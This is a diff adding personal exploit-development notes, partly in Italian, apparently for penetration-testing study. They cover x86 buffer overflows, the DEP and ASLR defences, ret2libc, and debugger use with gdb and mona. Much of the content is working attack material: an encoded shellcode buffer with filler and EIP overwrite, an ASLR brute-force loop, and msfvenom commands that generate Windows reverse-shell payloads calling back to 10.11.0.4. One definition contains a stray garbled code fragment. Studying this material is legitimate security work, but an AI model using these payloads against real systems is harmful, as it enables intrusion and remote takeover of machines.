@@ -1,0 +1,220 @@
+REGISTERS:
+    EAX (accumulator): Arithmetical and logical instructions
+    EBX (base): Base pointer for memory addresses
+    ECX (counter): Loop, shift, and rotation counter
+    EDX (data): I/O port addressing, multiplication, and division
+    ESI (source index): Pointer addressing of data and source in string copy operations
+    EDI (destination index): Pointer addressing of data and destination in string copy operations
+    ESP (stack pointer): keeps track of the most recently referenced location on the stack (top of the stack) by storing a pointer to it
+    EBP (base pointer): store a pointer to the top of the stack when a function is called
+    EIP (instruction pointer): it always points to the next code instruction to be executed
+
+ASSEMBLY INSTRUCTIONS:
+    PUSH
+    POP
+
+
+DEFENSES:
+    DEP (Data Execution Prevention): is a set of hardware and software technologies that perform additional checks on memory to
+                                     help prevent malicious code from os import extsep from sys import module from running on a system. The primary benefit of DEP is to help
+                                     prevent code execution from data pages by raising an exception when such attempts are made.
+    ASLR (Address Space Layout Randomization): randomizes the base addresses of loaded applications and DLLs every time the operating
+                                               system is booted. On older Windows operating systems like Windows XP where ASLR is not
+                                               implemented, all DLLs are loaded at the same memory address every time, making exploitation
+                                               much simpler.
+
+                                               check: cat /proc/sys/kernel/randomize_va_space     ---> se è uguale a 0 vuol dire che è disattivato
+
+    NX (No eXecute):
+
+    CFG (Control Flow Guard): Microsoft’s implementation of control-flow integrity, performs validation of indirect
+                              code branching, preventing overwrites of function pointers.
+    STACK CANARIES (stack smashing protection)
+
+BYPASS DEP:         (   checksec --format=cli --file=backup      )
+  DEP (NX)
+
+  We just need to use a technique called ret2libc. Instead of overwriting EIP with the address of our buffer, we’ll just put the address of a function in the C library, such as system, which we’ll use to call ‘bin/sh’ and give us a root shell. This is much easier than it sounds, firstly we just need to find the offset of the system function in libc.
+    readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
+  This will give us our offset. Now we need to find the same offset for the exit function. This isn’t completely necessary but it means that once we exit the shell, it will exit cleanly rather than segfaulting. We’re giving something for the program to return to once our shell is done. It’s exactly the same process as above.
+  We also need to find the location of a /bin/sh string which we can do using:
+    strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
+  And now we just get the memory location of our libc.so.6, so we can construct the full memory address of our functions.
+    ldd ovrflw | grep libc
+
+BYPASS ASLR:
+  se su una macchina 32 bit posso fare abbastanza tentativi fino a quando non si ripresenta un indirizzo di memeoria che sto usando nell'exploit
+  questo perchè il numero è abbastanza basso da poter provare abbastanza volte e ottenere una buona probabilità di riuscita (con 1000 volte dovrei riuscirci con una probabilità superiore a 80%)
+
+  while true; do ovrflw $(python -c 'print "\x90"*112 + "\x60\x82\x5e\xb7" + "\x10\x53\x5f\xb7" + "\xac\x7b\x71\xb7"'); done
+
+
+
+
+PATTERN CREATIONS:
+    msf-pattern_create -l 800
+    msf-pattern_offset -l 800 -q 42306142           //-q bytes to find in the patter of length 800, in hexadecimal
+
+
+
+
+OTHER CODE:
+    shellcode = ("\xbe\x55\xe5\xb6\x02\xda\xc9\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
+    "\x52\x31\x72\x12\x03\x72\x12\x83\x97\xe1\x54\xf7\xeb\x02\x1a"
+    "\xf8\x13\xd3\x7b\x70\xf6\xe2\xbb\xe6\x73\x54\x0c\x6c\xd1\x59"
+    "\xe7\x20\xc1\xea\x85\xec\xe6\x5b\x23\xcb\xc9\x5c\x18\x2f\x48"
+    "\xdf\x63\x7c\xaa\xde\xab\x71\xab\x27\xd1\x78\xf9\xf0\x9d\x2f"
+    "\xed\x75\xeb\xf3\x86\xc6\xfd\x73\x7b\x9e\xfc\x52\x2a\x94\xa6"
+    "\x74\xcd\x79\xd3\x3c\xd5\x9e\xde\xf7\x6e\x54\x94\x09\xa6\xa4"
+    "\x55\xa5\x87\x08\xa4\xb7\xc0\xaf\x57\xc2\x38\xcc\xea\xd5\xff"
+    "\xae\x30\x53\x1b\x08\xb2\xc3\xc7\xa8\x17\x95\x8c\xa7\xdc\xd1"
+    "\xca\xab\xe3\x36\x61\xd7\x68\xb9\xa5\x51\x2a\x9e\x61\x39\xe8"
+    "\xbf\x30\xe7\x5f\xbf\x22\x48\x3f\x65\x29\x65\x54\x14\x70\xe2"
+    "\x99\x15\x8a\xf2\xb5\x2e\xf9\xc0\x1a\x85\x95\x68\xd2\x03\x62"
+    "\x8e\xc9\xf4\xfc\x71\xf2\x04\xd5\xb5\xa6\x54\x4d\x1f\xc7\x3e"
+    "\x8d\xa0\x12\x90\xdd\x0e\xcd\x51\x8d\xee\xbd\x39\xc7\xe0\xe2"
+    "\x5a\xe8\x2a\x8b\xf1\x13\xbd\xbe\x0e\x1b\x2f\xd7\x12\x1b\x4e"
+    "\x9c\x9a\xfd\x3a\xf2\xca\x56\xd3\x6b\x57\x2c\x42\x73\x4d\x49"
+    "\x44\xff\x62\xae\x0b\x08\x0e\xbc\xfc\xf8\x45\x9e\xab\x07\x70"
+    "\xb6\x30\x95\x1f\x46\x3e\x86\xb7\x11\x17\x78\xce\xf7\x85\x23"
+    "\x78\xe5\x57\xb5\x43\xad\x83\x06\x4d\x2c\x41\x32\x69\x3e\x9f"
+    "\xbb\x35\x6a\x4f\xea\xe3\xc4\x29\x44\x42\xbe\xe3\x3b\x0c\x56"
+    "\x75\x70\x8f\x20\x7a\x5d\x79\xcc\xcb\x08\x3c\xf3\xe4\xdc\xc8"
+    "\x8c\x18\x7d\x36\x47\x99\x8d\x7d\xc5\x88\x05\xd8\x9c\x88\x4b"
+    "\xdb\x4b\xce\x75\x58\x79\xaf\x81\x40\x08\xaa\xce\xc6\xe1\xc6"
+    "\x5f\xa3\x05\x74\x5f\xe6")
+    filler = "A" * 780
+    eip = "\x83\x0c\x09\x10"
+    offset = "C" * 4
+    nops = "\x90" * 10
+    inputBuffer = filler + eip + offset + nops + shellcode
+
+
+IMPORTANT BAD CHARACTERS:
+    0x00    ->  null byte, indica fine string ain molti linguaggi come c e c++
+    0x0D    ->  return character, usato in HTTP per indicare la fine di un campo, quindi non va usato se lo shellcode è in una richiesta http
+    0x0A    ->  end of line in http (simile a carriage return)
+
+IMPORTANT CHARACTERS and OP:
+    jmp esp
+    0x90    ->  NOP (No Operation)
+
+
+
+ALL CHARS LIST (tranne 0x00):
+    //usare per testare qualica aratteri potrebbero essere bad per una certa applicazione
+    //per fare questo test mandarli per il buffer overflow e vedere come reagisce l'applicazione
+    badchars = (
+    "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
+    "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
+    "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
+    "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
+    "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
+    "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
+    "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
+    "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
+    "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
+    "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
+    "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
+    "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
+    "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
+    "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
+    "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
+    "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
+
+
+
+IMMUNITY DEBUGGER:
+    !mona modules
+    !mona find -s "\xff\xe4" -m "libspp.dll"        //cerca istruzione JUMP ESP nel dll indicato, FFE4 (\xff\xe4) è la rappresentazioen esadecimale di questa istruzione che può essere trovata usando il comando su kali: msf-nasm_shell
+
+EVANS DEBUGGER:
+    edb
+    OpcodeSearcher
+
+
+MSF NASM SHELL:
+    msf-nasm_shell
+    nasm> jmp esp
+    nasm> add eax,12
+    nasm> jmp eax
+
+GENERATING PAYLOADS:
+    msfvenom -l payloads
+    msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c           //-f --> formatting, -f c --> C-formatted shellcode
+    msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x25\x26\x2b\x3d"     //-e encoder, -b known bad characters
+    msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x25\x26\x2b\x3d"
+    msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x25\x26\x2b\x3d" -v shellcode
+
+
+
+STEPS:
+    1) discover the vulnerability
+    2) control eip
+    3) locate space for shellcode
+    4) check for bad characters
+    5) redirect the execution flow
+    6) find a return address (to esp) (jmp esp)
+    7) getting a shell (generate shellcode, with or without encoding based on bad characters present)
+
+
+GDB:
+    gdb <nomefile>
+    b 43                //set breakpoint
+    run                 //run program
+    run <parametri>
+    s                   //step line by line
+    b _start            //breakpoint at _start
+    del <breakpoint number>
+    disas <func name>
+    info func           //print funztion LIST
+    info r              //display info about current cpu REGISTERS
+    x/200x $sp          //controlla 200 lcoazioni sopra stack pointer (per controllare dove e cosa va nello stack)
+
+    //use same addersses of executable in gdb too:
+    unset env LINES
+    unset env COLUMNS
+    set env _=/usr/local/bin/ovrflw     //path to executable
+
+    //trovare jmp esp con gdb:
+
+    controllo i moduli caricati:
+
+    info sharedlibrary
+    From        To          Syms Read   Shared Object Library
+    0xb7750860  0xb776876c  Yes         /lib/ld-linux.so.2
+    0xb75ab490  0xb76decee  Yes         /lib/i386-linux-gnu/libc.so.6
+
+    e poi controllo se nei due intervalli From-To c'è un'istanza di jmp esp, il cui opcode è FFE4 (0xff,0xe4)
+
+    (gdb) find /b 0xb7750860,0xb776876c,0xff,0xe4
+    Pattern not found.
+    (gdb) find /b 0xb75ab490,0xb76decee,0xff, 0xe4
+    0xb76712ad <read+45>
+    1 pattern found.
+
+
+
+    p system
+    searchmem /bin/sh     --> in gdb base:
+                      find [/sn] start_addr, +len, val1 [, val2, …]
+                      find [/sn] start_addr, end_addr, val1 [, val2, …]
+
+
+OTHER IMPORTANT:
+
+    readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -e " system@" -e " exit@"           //find system offset
+
+    strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/"                        //find /bin/sh offset in the libc.so.6 library, must be added to libc base address (?)
+
+    ldd /usr/local/bin/ovrflw | grep libc                                       //check se c'è aslr -> se c'è l'indirizzo cambia sempre
+
+
+
+
+GDB (CON GEF):
+  //con debug attivo (metti punto di debug ovunque es. b main e poi fai partire con run )
+    gef➤  search-pattern /bin/sh
+    [+] Searching '/bin/sh' in memory
+    [+] In '/usr/lib/i386-linux-gnu/libc-2.32.so'(0xf7f30000-0xf7fa2000), permission=r--
+    0xf7f4a924 - 0xf7f4a92b  →   "/bin/sh"
